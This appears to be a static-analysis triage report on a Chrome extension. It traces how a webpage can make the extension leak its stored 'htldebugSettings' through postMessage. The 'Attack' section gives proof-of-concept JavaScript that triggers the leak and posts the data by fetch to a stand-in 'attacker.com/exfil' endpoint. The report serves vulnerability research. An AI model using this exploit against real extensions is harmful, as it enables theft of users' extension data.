# CoCo Analysis: nhijejfjieloehdlkicfakfjfmnkgnlf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (duplicate flows)

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nhijejfjieloehdlkicfakfjfmnkgnlf/opgen_generated_files/bg.js
Line 751: storage_local_get_source mock (CoCo framework)
Line 1107: chrome.storage.local.get('htldebugSettings') - reads settings from storage
Line 1113-1116: chrome.tabs.sendMessage sends storage data to content script

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nhijejfjieloehdlkicfakfjfmnkgnlf/opgen_generated_files/cs_0.js
Line 467: Content script receives chrome.runtime.onMessage and forwards via window.postMessage

**Code:**

```javascript
// Content script - content_script.js (line 467, minified)
// Listens for messages from webpage/bridge
window.addEventListener("message", (event) => {
  if (event.source !== window) return;
  if (!event.data.from || event.data.from !== "BRIDGE") return;

  // Webpage can send message with type="getHtldebugSettings"
  const message = event.data; // ← attacker-controlled message
  message.from = "CONTENT_SCRIPT";
  chrome.runtime.sendMessage(message); // ← forwards to background
});

// Forwards all messages from background to webpage
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  message.from = "CONTENT_SCRIPT";
  window.postMessage(message); // ← sends to webpage (attacker can listen)
  sendResponse();
});

// Background script - background.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'getHtldebugSettings') {
    // Handle getHtldebugSettings request from the bridge (forwarded by content_script)
    chrome.storage.local.get('htldebugSettings', (result) => {
      // Send to the content_script that sent this request
      console.log('Sending htldebugSettings to content_script in tab:', sender.tab.id);
      chrome.tabs.sendMessage(sender.tab.id, {
        type: 'htldebug.settings',
        payload: result.htldebugSettings, // ← storage data sent to content script
      });
    });
    sendResponse();
    return;
  }

  if (request.method === 'getHtldebugSettingsForStartup') {
    chrome.storage.local.get('htldebugSettings', (result) => {
      sendResponse({
        data: result.htldebugSettings, // ← storage data in response
        tabId: sender.tab.id,
      });
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// On any webpage (http://*/* or https://*/*)
// Step 1: Listen for the response
window.addEventListener("message", (event) => {
  if (event.data.type === "htldebug.settings" && event.data.from === "CONTENT_SCRIPT") {
    console.log("Exfiltrated htldebugSettings from extension storage:", event.data.payload);

    // Send to attacker server
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(event.data.payload)
    });
  }
});

// Step 2: Request the settings
window.postMessage({
  from: "BRIDGE",
  type: "getHtldebugSettings"
}, "*");

// The extension will:
// 1. Content script receives the message from webpage
// 2. Forwards to background via chrome.runtime.sendMessage
// 3. Background reads htldebugSettings from chrome.storage.local
// 4. Background sends data back via chrome.tabs.sendMessage
// 5. Content script forwards to webpage via window.postMessage
// 6. Attacker receives the storage data
```

**Impact:** Information disclosure vulnerability. A malicious webpage can request and receive the extension's htldebugSettings from chrome.storage.local. The extension acts as a bridge between the webpage and extension storage, allowing any webpage to read sensitive debugging configuration data stored by the extension. This violates the isolation between webpage context and extension storage.
